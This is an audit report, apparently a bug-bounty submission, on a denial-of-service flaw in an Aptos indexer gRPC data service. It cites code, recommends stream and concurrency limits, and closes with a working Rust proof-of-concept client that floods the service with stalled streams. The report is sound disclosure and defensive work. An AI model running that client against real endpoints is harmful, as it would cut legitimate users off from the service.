# Audit Report

## Title
Unbounded Concurrent Stream Spawning Enables Resource Exhaustion DoS Attack on Indexer gRPC Data Service

## Summary
The indexer-grpc-data-service-v2 lacks limits on concurrent gRPC streams and spawned tasks, allowing an attacker to exhaust server resources by opening many long-lived streaming connections. While the security question references "ConnectionManager's connection pool," the actual vulnerability involves unbounded HTTP/2 stream acceptance, task spawning, and stream state tracking that collectively enable a resource exhaustion attack preventing legitimate clients from accessing the service.

## Finding Description

The indexer-grpc-data-service-v2 service suffers from multiple unbounded resource allocations that enable a denial-of-service attack:

**1. No HTTP/2 Concurrent Stream Limits**

The tonic Server is configured without `http2_max_concurrent_streams` limits, accepting the default (typically unlimited or very high). [1](#0-0) 

**2. Unbounded Task Spawning**

Each incoming `GetTransactions` request spawns a new async task via `scope.spawn()` with no concurrency limit. [2](#0-1) 

Similarly in HistoricalDataService: [3](#0-2) 

The `handler_tx` channel has only a buffer of 10, but this only limits queued requests awaiting task spawning, not the number of spawned tasks themselves. [4](#0-3) 

**3. Unbounded Active Stream Tracking**

The ConnectionManager's `active_streams` DashMap has no size limit and grows with each spawned task. [5](#0-4) 

Each task inserts an entry: [6](#0-5) 

**4. No Rate Limiting or Authentication**

The service has no rate limiting, authentication, or maximum stream limits configured anywhere in the codebase.

**Attack Scenario:**

1. Attacker opens many HTTP/2 connections to the data service
2. Sends `GetTransactions` requests on multiple streams per connection with large version ranges
3. Consumes responses very slowly or stops after filling the response channel (size 5) [7](#0-6) 
4. Each streaming task blocks on `response_sender.send().await` when the client stops consuming [8](#0-7) 
5. Tasks accumulate indefinitely, exhausting memory, CPU, and file descriptors
6. Legitimate clients cannot establish new connections or receive service

While HTTP/2 keepalive settings exist (60s ping interval, 10s timeout), an attacker can maintain connections by responding to pings while keeping tasks blocked. [9](#0-8) 

## Impact Explanation

**Severity: HIGH** (up to $50,000 per Aptos Bug Bounty)

This qualifies as "API crashes" and "Validator node slowdowns" under High Severity. The attack:
- Causes service degradation or complete unavailability of the indexer data service
- Prevents legitimate indexer clients from accessing blockchain transaction data
- Can crash the service through memory exhaustion
- Requires minimal attacker resources (standard gRPC client)
- Affects critical infrastructure used by wallets, explorers, and indexer applications

The attack breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The service fails to enforce limits on concurrent operations, enabling unbounded resource consumption.

## Likelihood Explanation

**Likelihood: HIGH**

This attack is highly likely because:
- No authentication or authorization required
- Standard gRPC client libraries can easily open many streams
- No rate limiting exists at any layer
- Attack requires minimal sophistication (just open connections and request data)
- Service is publicly exposed for indexer client access
- Attacker can automate the attack with simple scripts

## Recommendation

Implement multiple defense layers:

**1. HTTP/2 Stream Limits**

```rust
let mut server_builder = Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .http2_max_concurrent_streams(Some(100)); // Add limit
```

**2. Bounded Task Spawning**

Use a semaphore to limit concurrent streaming tasks:

```rust
use tokio::sync::Semaphore;
use std::sync::Arc;

const MAX_CONCURRENT_STREAMS: usize = 1000;

// In config.rs, add to service creation
let stream_semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_STREAMS));

// In live_data_service/mod.rs, before spawning
let permit = stream_semaphore.clone().acquire_owned().await.unwrap();
scope.spawn(async move {
    let _permit = permit; // Hold permit for lifetime of task
    self.start_streaming(...).await
});
```

**3. Active Stream Limits**

Add size checks in ConnectionManager:

```rust
const MAX_ACTIVE_STREAMS: usize = 1000;

pub(crate) fn insert_active_stream(&self, ...) -> Result<(), Status> {
    if self.active_streams.len() >= MAX_ACTIVE_STREAMS {
        return Err(Status::resource_exhausted("Too many active streams"));
    }
    // ... existing code
}
```

**4. Per-Client Rate Limiting**

Implement IP-based or authentication-based rate limiting using middleware.

## Proof of Concept

```rust
// PoC: Rust client that exhausts server resources

use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient, GetTransactionsRequest
};
use tonic::Request;
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://localhost:50051"; // Data service endpoint
    let num_connections = 100;
    let streams_per_connection = 50;
    
    let mut handles = vec![];
    
    for conn_id in 0..num_connections {
        let target = target.to_string();
        let handle = tokio::spawn(async move {
            let mut client = DataServiceClient::connect(target)
                .await
                .expect("Failed to connect");
            
            for stream_id in 0..streams_per_connection {
                let request = GetTransactionsRequest {
                    starting_version: Some(0),
                    transactions_count: Some(u64::MAX), // Request maximum range
                    batch_size: Some(1000),
                    transaction_filter: None,
                };
                
                let mut stream = client
                    .get_transactions(Request::new(request))
                    .await
                    .expect("Failed to start stream")
                    .into_inner();
                
                // Consume only first message then stall
                if let Some(_) = stream.message().await.ok() {
                    println!("Conn {conn_id} Stream {stream_id} established");
                }
                
                // Keep stream alive but don't consume further
                tokio::spawn(async move {
                    loop {
                        sleep(Duration::from_secs(3600)).await;
                    }
                });
            }
        });
        
        handles.push(handle);
        sleep(Duration::from_millis(10)).await; // Slow spawn to observe
    }
    
    println!("Spawned {} connections with {} streams each", 
             num_connections, streams_per_connection);
    println!("Total: {} concurrent streams exhausting server", 
             num_connections * streams_per_connection);
    
    // Keep main alive
    futures::future::join_all(handles).await;
    Ok(())
}
```

**Expected Result**: After spawning thousands of streams, the data service becomes unresponsive to new legitimate client connections due to resource exhaustion (memory, CPU, file descriptors). Server metrics will show unbounded growth in active tasks and memory usage.

## Notes

The security question referenced "ConnectionManager's connection pool," but technically the ConnectionManager manages outbound connections to GrpcManager instances [10](#0-9)  rather than an inbound connection pool. However, the ConnectionManager is involved in the vulnerability through its unbounded `active_streams` tracking, and the overall attack achieves the described impact: preventing legitimate clients from connecting through resource exhaustion.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L36-37)
```rust
const HTTP2_PING_INTERVAL_DURATION: std::time::Duration = std::time::Duration::from_secs(60);
const HTTP2_PING_TIMEOUT_DURATION: std::time::Duration = std::time::Duration::from_secs(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L39-39)
```rust
const DEFAULT_MAX_RESPONSE_CHANNEL_SIZE: usize = 5;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L123-123)
```rust
        let (handler_tx, handler_rx) = tokio::sync::mpsc::channel(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L251-253)
```rust
        let mut server_builder = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-139)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L218-224)
```rust
                if response_sender.send(Ok(response)).await.is_err() {
                    info!(stream_id = id, "Client dropped.");
                    COUNTER
                        .with_label_values(&["live_data_service_client_dropped"])
                        .inc();
                    break;
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L112-123)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L101-108)
```rust
pub(crate) struct ConnectionManager {
    chain_id: u64,
    grpc_manager_connections: DashMap<String, GrpcManagerClient<Channel>>,
    self_advertised_address: String,
    known_latest_version: AtomicU64,
    active_streams: DashMap<String, (ActiveStream, StreamProgressSamples)>,
    is_live_data_service: bool,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L190-215)
```rust
    pub(crate) fn insert_active_stream(
        &self,
        id: &str,
        start_version: u64,
        end_version: Option<u64>,
    ) {
        self.active_streams.insert(
            id.to_owned(),
            (
                ActiveStream {
                    id: id.to_owned(),
                    start_time: Some(timestamp_now_proto()),
                    start_version,
                    end_version,
                    progress: None,
                },
                StreamProgressSamples::new(),
            ),
        );
        let label = if self.is_live_data_service {
            ["live_data_service"]
        } else {
            ["historical_data_service"]
        };
        NUM_CONNECTED_STREAMS.with_label_values(&label).inc();
    }
```
